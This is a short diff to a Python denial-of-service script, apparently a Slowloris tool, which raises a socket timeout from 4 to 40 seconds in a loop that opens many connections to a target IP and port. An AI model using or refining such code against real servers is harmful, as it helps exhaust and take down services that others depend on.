@@ -52,7 +52,7 @@ def slowloris():
 		for k in range(howmany_sockets):
 			try:
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-				s.settimeout(4)
+				s.settimeout(40)
 				s.connect((args.ip, port))
 				allthesockets.append(s)
 			except Exception as e:
